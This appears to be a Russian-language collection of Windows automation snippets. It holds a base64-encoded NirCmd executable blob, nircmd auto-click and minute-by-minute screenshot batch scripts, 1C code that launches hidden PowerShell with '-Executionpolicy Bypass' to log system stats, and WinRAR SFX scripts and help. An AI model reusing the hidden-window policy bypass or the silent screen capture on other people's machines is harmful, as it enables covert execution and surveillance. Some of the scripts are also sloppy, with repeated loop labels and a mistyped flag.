AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAZxMAAMyhAQBoEwAA
4RMAAKSfAQDkEwAANhQAAMChAQA4FAAAkhQAAKSfAQDkFAAAnxUAAJCeAQCgFQAA
PhYAAHyeAQBAFgAAcxYAAISlAQB8FgAAxBYAAOCdAQDEFgAAHhcAAKyeAQAgFwAA
URcAAKSfAQBUFwAA1BcAAJifAQDUFwAAuhsAAKShAQC8GwAAdR0AAIihAQB4HQAA
uR0AAKyeAQC8HQAA6h0AAKSfAQDsHQAAEh4AAKSfAQAUHgAAPB4AAKSfAQA8HgAA
ex4AAKSfAQB8HgAAWh8AAAikAQBcHwAAByAAAGylAQAIIAAAXiAAAKyeAQBgIAAA
byEAAKyeAQBwIQAAuiEAAGieAQC8IQAA4CEAAKSfAQDgIQAAbiIAAFilAQBwIgAA
zCIAAPijAQDMIgAAAiMAAKyeAQAEIwAADSUAAOCjAQAQJQAAlCUAAFilAQCUJQAA
FCYAADimAQAUJgAA4yYAACSmAQDkJgAAzycAANCjAQDQJwAAjCgAAIifAQCMKAAA
uigAAICfAQC8KAAA6igAAICfAQDsKAAAKSkAAMChAQAsKQAAXykAAKSfAQBgKQAA
3CkAACigAQDcKQAAKyoAAIijAQAsKgAA0ioAAMCfAQDUKgAArisAAGCfAQCwKwAA
4CsAAOCdAQDgKwAAPiwAAHyhAQBALAAAfiwAAKyeAQCALAAAJS0AAMCjAQAoLQAA
8y0AAACgAQD0LQAAHi4AAOCdAQAgLgAAyi8AAGShAQDMLwAAGzAAAIijAQAcMAAA
PzAAAFifAQBAMAAA6DAAAECfAQDoMAAA1TEAAKSfAQDYMQAAdjIAAFShAQB4MgAA
4TIAAMCfAQDkMgAAYDQAADyhAQBgNAAAtjUAACihAQC4NQAAvjYAABChAQDANgAA
VzcAAHyeAQBYNwAAkzcAAKSfAQCUNwAAXzgAAPSgAQBgOAAAzzgAAHyeAQDQOAAA
+DgAAKSfAQD4OAAAaTkAALCjAQBsOQAADToAAJijAQAQOgAAxDoAAPijAQDEOgAA
5joAAKSfAQDoOgAAYzsAAIijAQBkOwAAMjwAAMCfAQA0PAAAMz0AAHyeAQA0PQAA
dz0AAKyeAQB4PQAACUAAAGyjAQAMQAAAAkEAACyfAQAEQQAA/0EAANigAQAAQgAA
uEIAABSnAQC4QgAALkMAAJCeAQAwQwAA/kMAABifAQAARAAAjUQAAMygAQCQRAAA
hEcAADylAQCERwAAsEgAAFSjAQCwSAAAGEoAADSjAQAYSgAAfFAAAASfAQB8UAAA
1lQAAOieAQDYVAAAPFcAAKygAQA8VwAAiFcAAKSfAQCIVwAA31cAAKSfAQDgVwAA
1VsAACCjAQDYWwAAS14AAMyeAQBMXgAAc18AAKSfAQB0XwAA/V8AALieAQAAYAAA
RGIAAIygAQBEYgAA0GMAAAijAQDQYwAAQGQAAIijAQBAZQAAwGUAAHyeAQDAZQAA
pWYAAHygAQCoZgAAnm4AAASmAQCgbgAADG8AAMimAQAMbwAAY28AAIijAQBkbwAA
l28AAOCdAQCYbwAALHAAAPSiAQAscAAAUHAAAOCdAQBQcAAAinEAACilAQCMcQAA
EXMAAPClAQAUcwAAuXQAANyiAQC8dAAACHYAABClAQAIdgAAKHcAAPikAQAodwAA
OXgAAKymAQA8eAAATXkAAKymAQBQeQAANHoAAIijAQA0egAABnwAAKyeAQAIfAAA
uXwAAKSfAQC8fAAAEX0AAKyeAQAUfQAAZn0AAKyeAQBofQAAun0AAKyeAQC8fQAA
CYAAAMSiAQAMgAAAqYMAAOCkAQCsgwAAKYYAAIymAQAshgAAXYsAAHyeAQBgiwAA
14wAAGigAQDYjAAA/o4AAMikAQAQjwAAWI8AAIijAQBYjwAAbJkAAKykAQB8mQAA
xJ0AAIykAQDEnQAASJ8AAHCkAQBInwAAqaAAAFSkAQCsoAAAsqIAADikAQC0ogAA
KqMAAAynAQAsowAA76MAADynAQDwowAAxqYAALCiAQDIpgAAd6cAANSlAQB4pwAA
tqcAAKSfAQC4pwAAvakAAPSmAQDAqQAA9qoAAMSlAQD4qgAAgKwAAHSmAQCArAAA
t64AACCnAQC4rgAAWrAAANymAQBcsAAAphsBAFCnAQCoGwEArhwBAOCdAQCwHAEA
9B0BAFSgAQD0HQEAPx4BAKyeAQBAHgEAgB4BAKSfAQCAHgEAaR8BAKSfAQBsHwEA
VSABAKSfAQBYIAEAjyABAOCdAQCQIAEAZiEBAIylAQBoIQEAkyIBAJiiAQCUIgEA
DCUBAHyiAQAMJQEAsSYBAKylAQC0JgEAlScBAOShAQCYJwEA3ycBAKSfAQDgJwEA
EigBAOCdAQAUKAEAWygBAKSfAQBcKAEAvigBAKyeAQDAKAEAIykBAPShAQAkKQEA
aSkBAKyeAQBsKQEAyisBAGSiAQDMKwEAVSwBAKSfAQBYLAEAGC0BAKyeAQAYLQEA
cS0BAHyeAQB0LQEAzS0BAHyeAQDQLQEAKzABAECgAQAsMAEAVTABAKSeAQBYMAEA
szABAJCeAQC0MAEAOjEBAFShAQA8MQEA0zEBAFShAQDUMQEAITIBAKyeAQAkMgEA
hzIBAIijAQCIMgEAAjMBAHyeAQAEMwEAuTMBACigAQC8MwEARTUBAEyiAQBINQEA
UzYBAHyeAQBUNgEAxzcBAOCdAQDINwEAlDgBABSgAQCUOAEAsDkBAACgAQCwOQEA
DjoBAOCdAQAQOgEA6ToBAOCdAQDsOgEAGjwBADiiAQAcPAEAjDwBAHCeAQCMPAEA
0zwBAHCeAQDUPAEALD0BAGieAQAsPQEASj0BAOCdAQBMPQEA+D0BAOyfAQBoPgEA
7D4BAKSfAQDsPgEAET8BAOCdAQAUPwEAZz8BAIijAQBoPwEA4j8BAACgAQDkPwEA
9UEBACSkAQD4QQEAcEMBANifAQBwQwEA+UUBACSiAQD8RQEAHEgBABSkAQAcSAEA
yUgBAKClAQDMSAEARkkBAMChAQBISQEAc0oBAAyiAQB0SgEAEUsBAMCfAQAUSwEA
tksBAMCfAQC4SwEABE4BAEieAQAETgEAsk8BAFymAQC0TwEAZFABAIylAQBkUAEA
4VMBAEimAQDkUwEA41QBADieAQDkVAEAOFUBAIijAQA4VQEADVYBACieAQAQVgEA
+lYBAKyfAQD8VgEAuFcBAPyhAQC4VwEAZFgBAPijAQBkWAEA4FgBAMChAQDgWAEA
BVkBAKSfAQAIWQEAWlkBAPShAQBcWQEAbVoBAOShAQCAWgEAw1oBAOCdAQCAWwEA
6F0BAPCdAQDwXQEADF4BAOidAQBgXgEArl4BAGinAQDgXgEA+l4BAOCdAQD8XgEA
H18BAOCdAQAwXwEAU18BAOCdAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAUA
AQAAADgAAIAFAAAAUAAAgAwAAABwAACAEAAAAIgAAIAYAAAAoAAAgAAAAAAAAAAA
BAAAAAAAAQABAAAAuAAAgAAAAAAAAAAABAAAAAAAAgBmAAAA0AAAgHAAAADoAACA
AAAAAAAAAAAEAAAAAAABAGcAAAAAAQCAAAAAAAAAAAAEAAAAAAABAAEAAAAYAQCA
AAAAAAAAAAAEAAAAAAABAAEAAAAwAQCAAAAAAAAAAAAEAAAAAAABAAkEAABIAQAA
AAAAAAAAAAAEAAAAAAABAA0EAABYAQAAAAAAAAAAAAAEAAAAAAABAA0EAABoAQAA
AAAAAAAAAAAEAAAAAAABAAkEAAB4AQAAAAAAAAAAAAAEAAAAAAABAA0EAACIAQAA
AAAAAAAAAAAEAAAAAAABAAkEAACYAQAAqOEBADQBAADkBAAAAAAAANziAQBAAQAA
5AQAAAAAAAAc5AEAFAEAAOQEAAAAAAAAMOUBABQAAADkBAAAAAAAAETlAQCoAgAA
5AQAAAAAAADs5wEATQMAAOQEAAAAAAAABwAAACgAAAAgAAAAQAAAAAEAAQAAAAAA
AAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////AAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAD+AAAA/gAAAf8AAAP/AAAH/4AAB/+AAA//gAAP/8AA
H//AAB//wAA5/8AAMf7AAGG2wAABtsAAAbYAAAG2AAABsAAAAYAAAAGAAAABgAAA
AYAAAAGAAAAAAAAA///////////////////////////////////////////+AP//
/gD///4A///8AH//+AB///AAP//wAD//4AA//+AAH//AAB//wAAf/4AAH/+EAB//
DAAf/xwAH//8AD///AD///wB///8D////D////w////8P////D////5////AAMiA
AAAAAAUAAAAAAFgBSgAAAAAAVAB5AHAAZQAgAHQAaABlACAAdABlAHgAdAAgAGYA
bwByACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAHAAYQByAGEAbQBlAHQA
ZQByAAAACABNAFMAIABTAGEAbgBzACAAUwBlAHIAaQBmAAAAAQABUAAAAADjADIA
MgAOAAEA//+AAE8ASwAAAAAAAAAAAAFQAAAAAB8BMgAyAA4AAgD//4AAQwBhAG4A
YwBlAGwAAAAAAAAAgACBUAAAAAAHAB0ASgENAOkD//+BAAAAAAAAAAAAAlAAAAAA
QwAHAJMACQDqA///ggAAAAAAAAAAAAJQAAAAAAcABwA5AAoA6wP//4IAUABhAHIA
YQBtAGUAdABlAHIAIABOAGEAbQBlADoAAAAAAMAAyIAAAAAABQAAAAAA3QBqAAAA
AAAAAAgATQBTACAAUwBhAG4AcwAgAFMAZQByAGkAZgAAAAAAAQABUAAAAACpAFUA
KwAOAAEA//+AAE8ASwAAAAAAAAAAAAJQAAAAAAcADQDKAC4A6gP//4IAAAAAAAAA
AAACUAAAAAAuAEEAhAAIAOwD//+CAFMAdABhAHQAaQBjAAAAAAAAAAAAAlAAAAAA
BwBBACAACAD/////ggBXAGUAYgAgAFMAaQB0AGUAOgAAAAAAAAABUAAAAAA4AFUA
aAAOAOgD//+AAEMAbwBwAHkAIABUAG8AIABXAGkAbgBkAG8AdwBzACAARABpAHIA
ZQBjAHQAbwByAHkAAAAAAAAAAgABACAAQAABAAEANAEAAAEAqAI0AAAAVgBTAF8A
VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEACAACAOQAAwAIAAIA
5AADAD8AAAAAAAAABAAEAAEAAAAAAAAAAAAAAAAAAAAGAgAAAQBTAHQAcgBpAG4A
ZwBGAGkAbABlAEkAbgBmAG8AAADiAQAAAQAwADQAMAA5ADAANABiADAAAAAwAAgA
AQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAE4AaQByAFMAbwBmAHQAAAA2AAcA
AQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAATgBpAHIAQwBtAGQA
AAAAACoABQABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMgAuADgAMwAAAAAA
LgAHAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABOAGkAcgBDAG0AZAAAAAAA
aAAiAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkA
ZwBoAHQAIACpACAAMgAwADAAMwAgAC0AIAAyADAAMQA5ACAATgBpAHIAIABTAG8A
ZgBlAHIAAAA+AAsAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAA
TgBpAHIAQwBtAGQALgBlAHgAZQAAAAAALgAHAAEAUAByAG8AZAB1AGMAdABOAGEA
bQBlAAAAAABOAGkAcgBDAG0AZAAAAAAALgAFAAEAUAByAG8AZAB1AGMAdABWAGUA
cgBzAGkAbwBuAAAAMgAuADgAMwAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4A
ZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAkEsAQ8YXNz
ZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBt
YW5pZmVzdFZlcnNpb249IjEuMCIgeG1sbnM6YXNtdjM9InVybjpzY2hlbWFzLW1p
Y3Jvc29mdC1jb206YXNtLnYzIj48YXNtdjM6YXBwbGljYXRpb24+DQogICAgPGFz
bXYzOndpbmRvd3NTZXR0aW5ncyB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9z
b2Z0LmNvbS9TTUkvMjAwNS9XaW5kb3dzU2V0dGluZ3MiPg0KICAgICAgPGRwaUF3
YXJlPnRydWU8L2RwaUF3YXJlPg0KICAgIDwvYXNtdjM6d2luZG93c1NldHRpbmdz
Pg0KICA8L2FzbXYzOmFwcGxpY2F0aW9uPjxjb21wYXRpYmlsaXR5IHhtbG5zPSJ1
cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmNvbXBhdGliaWxpdHkudjEiPiANCgk8
YXBwbGljYXRpb24+IA0KCQkgDQoJCTxzdXBwb3J0ZWRPUyBJZD0iezhlMGY3YTEy
LWJmYjMtNGZlOC1iOWE1LTQ4ZmQ1MGExNWE5YX0iPjwvc3VwcG9ydGVkT1M+DQoJ
CQ0KCQk8c3VwcG9ydGVkT1MgSWQ9InsxZjY3NmM3Ni04MGUxLTQyMzktOTViYi04
M2QwZjZkMGRhNzh9Ij48L3N1cHBvcnRlZE9TPg0KCQkNCgkJPHN1cHBvcnRlZE9T
IElkPSJ7ZTIwMTE0NTctMTU0Ni00M2M1LWE1ZmUtMDA4ZGVlZTNkM2YwfSI+PC9z
dXBwb3J0ZWRPUz4gDQoJCQ0KCQk8c3VwcG9ydGVkT1MgSWQ9InszNTEzOGI5YS01
ZDk2LTRmYmQtOGUyZC1hMjQ0MDIyNWY5M2F9Ij48L3N1cHBvcnRlZE9TPg0KCQkN
CgkJPHN1cHBvcnRlZE9TIElkPSJ7NGEyZjI4ZTMtNTNiOS00NDQxLWJhOWMtZDY5
ZDRhNGE2ZTM4fSI+PC9zdXBwb3J0ZWRPUz4NCgk8L2FwcGxpY2F0aW9uPiANCjwv
Y29tcGF0aWJpbGl0eT48L2Fzc2VtYmx5PlBBRFBBRERJTkdYWFBBRERJTkdQQURE
SU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURE
SU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURE
SU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBRERJTkdYWFBBRERJTkdQQURE
SU5HWFhQQURESU5HUEFERElOR1hYUEFERElOR1BBREQ=
-----END CERTIFICATE-----"}
},
{0,
{"Клик мышью 1",0,0,"","@echo off
nircmd setcursor 390 390
nircmd wait 100
:loop
nircmd sendmouse left click
nircmd wait 500
goto loop"}
},
{0,
{"Клик мышью 2",0,0,"","@echo off
nircmd setcursor 390 390
nircmd wait 100
:loop
Nircmdc sendkeypress Home
nircmd wait 10000
:loop
Nircmdc sendkeypress Up
nircmd wait 500
:loop
Nircmdc sendkeypress Down
nircmd wait 500
:loop
nircmd sendmouse left click
nircmd wait 100
goto loop"}
},
{0,
{"Скриншёт периодически",0,0,"","@echo off

set curr_date=%date:~6,4%%date:~3,2%%date:~0,2%
if not exist ""C:\Users\Admin\Pictures\OfficeScreen\%curr_date%"" mkdir ""C:\Users\Admin\Pictures\OfficeScreen\%curr_date%""

nircmd.exe loop 1000000 60000 savescreenshot C:\Users\Admin\Pictures\OfficeScreen\~$currdate.yyyyMMdd$\scr~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png"}
},
{0,
{"Скриншёт браузера периодически",0,0,"","@echo off

set curr_date=%date:~6,4%%date:~3,2%%date:~0,2%
if not exist ""C:\Users\Admin\Pictures\OfficeScreen\%curr_date%"" mkdir ""C:\Users\Admin\Pictures\OfficeScreen\%curr_date%""

""C:\Program Files\Mozilla Firefox\firefox.exe"" ""https://saferegion.net/cams/iframe/us7soT4P/f32d01027144cc656fdbd6771c583d48/hls/""
nircmd.exe loop 1000000 60000 savescreenshot C:\Users\Admin\Pictures\OfficeScreen\~$currdate.yyyyMMdd$\scr~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png"}
}
},
{0,
{"Запустить скрипт CMD",0,0,"","ObjShell 			= Новый COMОбъект(""WScript.Shell"") ;
ПутьКФайлу 			= ПолучитьИмяВременногоФайла(""txt"");
ПутьКФайлуВКавычках = """""""" + ПутьКФайлу + """""""";
Script 				= ""/c typeperf """"\Процессор(_Total)\% загруженности процессора"""" -sc 1 >> "" + ПутьКФайлуВКавычках + "" & typeperf """"\Память\% использования выделенной памяти"""" -sc 1 >> "" + ПутьКФайлуВКавычках + "" & typeperf """"\Физический диск(_Total)\% активности диска"""" -sc 1 >> "" + ПутьКФайлуВКавычках + "" & exit 1"";
ObjScriptExec 		= ObjShell.Run(""cmd.exe "" + Script, 0, True); //Exec открывает окно консоли, только Run с доп параметрами его не открывает, но тогда результат только через файл

ТекстовыйФайл.Прочитать(ПутьКФайлу, КодировкаТекста.OEM);
лРезультатПроизводительностьСтроки 	= ТекстовыйФайл.ПолучитьТекст();

//Удалим файл
Файл 		= Новый Файл(ПутьКФайлу);
Если Файл.Существует() Тогда
	УдалитьФайлы(ПутьКФайлу);
КонецЕсли;"}
},
{0,
{"Запустить скрипт PowerShell",0,0,"","ObjShell 			= Новый COMОбъект(""WScript.Shell"") ;
ПутьКФайлу 			= ПолучитьИмяВременногоФайла(""txt"");
Script 				= ПолучитьСкриптPowerShell(ПутьКФайлу);
ObjScriptRun 		= ObjShell.Run(""Powershell.exe -windowstyle hidden -Executionpolicy Bypass -nologo -noninteractive -comand "" + Script, 0, True);
//ObjScriptExec 	= ObjShell.Exec(""powershell.exe -windowstyle hidden -Executionpolicy Bypass -nologo -noninteractive -comand "" + Script); //Exec открывает окно консоли, только Run с доп параметрами его не открывает, но тогда результат только через файл
//StrPingResults 	= НРег(ObjScriptExec.StdOut.ReadAll());

ТекстовыйФайл.Прочитать(ПутьКФайлу);
лРезультатПроцессы 	= ТекстовыйФайл.ПолучитьТекст();

//Удалим файл
Файл 		= Новый Файл(ПутьКФайлу);
Если Файл.Существует() Тогда
	УдалитьФайлы(ПутьКФайлу);
КонецЕсли;

&НаКлиенте
Функция ПолучитьСкриптPowerShell(ПутьКФайлу)

	Script = ""
	|$File = '"" + ПутьКФайлу + ""'
	|$DateTime = (Get-Date -Format """"dd.MM.yyyy HH:mm:ss"""")
	|$DateTime >> $File
	|exit 1"";

	Возврат Script;
	
КонецФункции // ПолучитьСкриптPowerShell()
"}
},
{0,
{"Пример скрипта PowerShell",0,0,"","&НаКлиенте
Функция ПолучитьСкриптPowerShell(ПутьКФайлу, пЧислоВыводимыхПроцессов = 5)

	Script = ""
	|$File = '"" + ПутьКФайлу + ""'
	|$DateTime = (Get-Date -Format """"dd.MM.yyyy HH:mm:ss"""")
	|#$DateTime >> $CpuLogFile
	|$usedDiskSpaceDrives = ''
	|$driveLetters = Get-WmiObject Win32_Volume | select DriveLetter
	|foreach ($driveLetter in $driveLetters)
	|{
	|$drive = Get-WmiObject Win32_Volume | where {$_.DriveLetter -eq $driveLetter.DriveLetter}
	|
	|if (-Not $drive.Capacity -eq 0)
	|{
	|$driveCapacity = $drive.Capacity
	|$usedDiskSpace = $driveCapacity - $drive.FreeSpace
	|$usedDiskSpacePct = [math]::Round(($usedDiskSpace / $drive.Capacity) * 100,1)
	|$usedDiskSpaceValues = '^driveCapacity=' + $driveCapacity +'^usedDiskSpace=' + $usedDiskSpace + '^usedDiskSpacePct=' + $usedDiskSpacePct
	|#$usedDiskSpacePct = """"{0:N2}"""" -f $usedDiskSpacePct
	|
	|
	|$usedDiskSpaceDrives = $usedDiskSpaceDrives + '^driveCaption=' + $drive.Caption + '=' + $usedDiskSpaceValues + '#'
	|}
	|}
	
	|# Lets throw them into an object for outputting
	|$objHostInfo = New-Object System.Object
	|$objHostInfo | Add-Member -MemberType NoteProperty -Name Name -Value $computer
	|$objHostInfo | Add-Member -MemberType NoteProperty -Name CPULoadPercent -Value $ComputerCpu
	|$objHostInfo | Add-Member -MemberType NoteProperty -Name CpuLoadAverage -Value $CpuLoadAverage
	|$objHostInfo | Add-Member -MemberType NoteProperty -Name MemoryUsedPercent -Value $PercentMemoryUsed
	|$objHostInfo | Add-Member -MemberType NoteProperty -Name usedDiskSpaceDrives -Value $usedDiskSpaceDrives
	
	|$objHostInfoStr = 'ComputerCpu=' + $ComputerCpu + ';CpuLoadAverage=' + $CpuLoadAverage + ';PercentMemoryUsed=' + $PercentMemoryUsed + ';usedDiskSpaceDrives={' + $usedDiskSpaceDrives + '}'
	|$objHostInfoStr >> $CpuLogFile
	|#$objHostInfoStr
	|# Lets dump our info into an array
	|#$objHostInfo >> $CpuLogFile
	
	|#'CPU LoadPercentage Average|' + $CpuLoad >> $CpuLogFile
	|$Process = Get-Process | Sort-Object CPU -desc | Select-Object -first "" + пЧислоВыводимыхПроцессов + ""
	|$Process >> $CpuLogFile
	|#$Process
	|exit 1"";

	Возврат Script;
	
КонецФункции // ПолучитьСкриптPowerShell_Процессы()
"}
},
{0,
{"CMD RAR (архивы установщиком SFX по 50 мб) (можно перетащить файл на файл *.cmd)",0,0,"","@: Установка русской кодировки
chcp 1251

echo Упаковать в SFX по 50 мб
For %%i In (%*) Do (
	echo %%i
	set FileName = %%~ni_p50m
	""C:\Program Files\WinRAR\WinRAR.exe"" a %%~ni_p50m %%i -v50m -sfx
)"}
},
{0,
{"RAR Архив Справка",0,0,"","Синтаксис командной строки

WinRAR допускает управление из командной строки. Общий синтаксис командной строки таков:

Bash
WinRAR <команда> -<ключ1> -<ключN> <архив> <файлы…> <@файл-список…> <путь для извлечения\>


команда	Комбинация символов, определяющая действие, которое будет выполнять WinRAR. См. ""Список команд WinRAR"".
ключ	Ключи используются для определения специфических действий, степени сжатия, типа архива и пр. См. ""список ключей WinRAR"".
архив	Имя обрабатываемого архива.
файлы	Имена обрабатываемых файлов.
файл-список	Файлы-списки - это обычные текстовые файлы, содержащие имена файлов для обработки. Каждое имя файла должно быть указано на отдельной строке и начинаться с первой позиции строки. В файл-список допускается помещать комментарии, признак начала комментария - символы //. Например, для архивирования файлов *.txt из папки c:\work\doc, файлов *.bmp из папки c:\work\image и всех файлов из папки c:\work\misc можно создать backup.lst, содержащий следующие строки:
.	c:\work\doc\*.txt //резервная копия текстов
.	c:\work\image\*.bmp //резервная копия рисунков
.	c:\work\misc
.	После этого для архивирования достаточно будет выполнить команду:
.	
Bash
winrar a backup @backup.lst
.
путь для извлечения	Используется только с командами e и x и указывает папку, в которую нужно извлекать файлы. Если эта папка не существует, то она будет создана.

Примечания

а) Если не указаны ни файлы, ни файл-список, то подразумевается шаблон *.*, т.е. WinRAR обработает все файлы.

б) Если при создании архива не указано его расширение, то WinRAR будет использовать формат архива по умолчанию, выбранный в профиле архивации по умолчанию, но если вы хотите указать тип архива явно, то это можно сделать добавлением расширения .rar или .zip к имени архива.

Если при распаковке архива не указано его расширение, то WinRAR считает, что это архив .rar, т.е. маска '*' (без кавычек) означает все архивы с расширением .rar. Если требуется обработать все архивы, не имеющие в имени расширения, то нужно использовать маску '*.' (без кавычек). Маска *.* выбирает все файлы. Символы подстановки (шаблоны) можно использовать в большинстве операций, таких как извлечение, тестирование и многих других, однако при архивировании и удалении шаблоны запрещены.

в) Ключи, введённые в командной строке, имеют более высокий приоритет, чем соответствующие установки в диалоговом окне конфигурации, т.е. используются параметры, заданные ключами.

г) Для команд C, E, S, T, RR, K и X в имени архива допускается использовать шаблоны, поэтому одной командой можно обработать сразу нескольких архивов. Более того, если вместе с этими командами указать ключ -r, то поиск архивов будет вестись и во всех вложенных папках.

д) Некоторые команды и ключи применимы только к архивам RAR, некоторые — к архивам RAR и ZIP, а некоторые — к архивам всех поддерживаемых форматов. Это зависит от возможностей, заложенных в формат архива.

е) Команды и ключи не зависят от регистра символов, поэтому вы можете набирать их как строчными, так и прописными буквами.

ж) Если какой-либо компонент командной строки содержит пробелы, он должен быть заключён в двойные кавычки.

Примеры
Добавить папку ""c:\latest data"" в архив Info.rar 
Bash
WinRAR a Info.rar ""c:\latest data""
Распаковать архив Info.rar в папку d:\data 
Bash
WinRAR x Info.rar d:\data\
Список команд

A	Добавить файлы в архив
C	Добавить архивный комментарий
CH	Изменить параметры архива
CV	Преобразовать архивы
CW	Записать в файл комментарий архива
D	Удалить файлы из архива
E	Извлечь файлы из архива, игнорируя пути
F	Освежить имеющиеся файлы в архиве
I	Найти строку в архивах
K	Заблокировать архив
M	Переместить файлы и папки в архив
R	Восстановить повреждённый архив
RC	Воссоздать недостающие тома
RN	Переименовать файлы в архиве
RR[N]	Добавить информацию для восстановления
RV[N]	Создать тома для восстановления
S[имя]	Преобразовать архив в самораспаковывающийся
S-	Удалить SFX-модуль
T	Протестировать файлы в архиве
U	Обновить файлы в архиве
X	Извлечь файлы из архива с полными путями

Список ключей

--	Прервать дальнейший поиск ключей в командной строке
-@[+]	Запретить [разрешить] списки файлов
-ac	Снять атрибут ""Архивный"" после архивации или извлечения
-ad	Добавить к пути назначения имя архива
-af<тип>	Указать формат архива
-ag[формат]	Добавить к имени архива текущую дату и время
-ai	Игнорировать файловые атрибуты
-ao	Добавить файлы с установленным атрибутом ""Архивный""
-ap<путь>	Установить путь внутри архива
-as	Синхронизировать содержимое архива
-av	Добавить электронную подпись
-av-	Запретить добавление/проверку электронной подписи
-cfg-	Игнорировать профиль по умолчанию и переменную окружения
-cl	Преобразовать имена файлов в нижний регистр
-cp<имя>	Выбрать профиль упаковки
-cu	Преобразовать имена файлов в верхний регистр
-df	Удалить файлы после архивации
-dh	Открывать совместно используемые файлы
-dr	Удалить файлы в Корзину
-ds	Не сортировать файлы при архивации
-dw	Уничтожить (затереть) файлы после архивации
-ed	Не добавлять пустые папки
-en	Не добавлять блок ""Конец архива""
-ep	Исключить пути из имён
-ep1	Исключить из пути базовую папку
-ep2	Сохранять полные пути файлов
-ep3	Сохранять полные пути, включая букву диска
-e[+]<атр>	Задать исключение или включение файлов из/в обработку по маске атрибутов
-f	Освежить имеющиеся файлы
-hp[пароль]	Шифровать и данные, и заголовки файлов
-iadm	Запрашивать административный доступ для SFX-архива
-ibck	Запустить WinRAR как фоновый процесс в системном лотке
-ieml[.][адрес]	Отправить архив по электронной почте
-iicon<имя>	Указать значок для SFX-модуля
-iimg<имя>	Указать логотип для SFX-модуля
-ilog[имя]	Записывать протокол ошибок в файл
-inul	Не выводить сообщения об ошибках
-ioff	Выключить компьютер
-k	Заблокировать архив
-kb	Сохранять на диске файлы, извлечённые с ошибками
-log[формат][=имя]	Записывать имена в файл-протокол
-m<n>	Установить метод сжатия
-mc<параметры>	Указать дополнительные параметры сжатия
-md<n>	Установить размер словаря
-ms[список]	Указать типы файлов для архивирования без сжатия
-mt<потоки>	Установить число потоков
-n<файл>	Включить в обработку только указанный файл
-n@<файл-список>	Включить в обработку только файлы, указанные в файле-списке
-oc	Установить NTFS-атрибут ""Сжатый""
-or	Переименовывать файлы автоматически
-os	Сохранить потоки NTFS
-ow	Обработать информацию о правах доступа к файлам
-o[+,-]	Установить режим перезаписи
-p[пароль]	Установить пароль
-r	Обрабатывать вложенные папки
-r-	Запретить рекурсию (обработку вложенных папок)
-r0	Обрабатывать вложенные папки только по шаблону
-ri	Установить приоритет и время простоя
-rr[N]	Добавить информацию для восстановления
-rv[N]	Создать тома для восстановления
-s	Создать непрерывный архив
-s<N>	Создать непрерывные группы, используя счётчик файлов
-sc<набор символов>[объекты]	Указать набор символов (и объекты)
-se	Создать непрерывные группы, используя расширения файлов
-sfx[имя]	Создать самораспаковывающийся архив
-sl<размер>	Обрабатывать файлы размером меньше указанного
-sm<размер>	Обрабатывать файлы размером больше указанного
-sv	Создать независимые непрерывные тома
-sv-	Создать зависимые непрерывные тома
-s-	Запретить создание непрерывных архивов
-t	Протестировать файлы после архивирования
-ta<дата>	Обрабатывать файлы, изменённые после указанной даты
-tb<дата>	Обрабатывать файлы, изменённые до указанной даты
-tk	Сохранять исходное время архива
-tl	Установить время архива по самому новому файлу
-tn<время>	Обрабатывать файлы не старее, чем указанный период времени
-to<время>	Обрабатывать файлы более старые, чем указанный период времени
-ts<m,c,a>	Сохранить/восстановить время файлов (модификации, создания, последнего доступа)
-u	Обновить файлы
-v<n>[k,b,f,m,M,g,G]	Создать многотомный архив
-vd	Очищать сменный диск перед архивацией на него
-ver[n]	Управление версиями файлов
-vn	Использовать старую схему именования томов
-vp	Делать паузу перед каждым томом
-w<путь>	Задать папку для временных файлов
-x<файл>	Не обрабатывать указанный файл
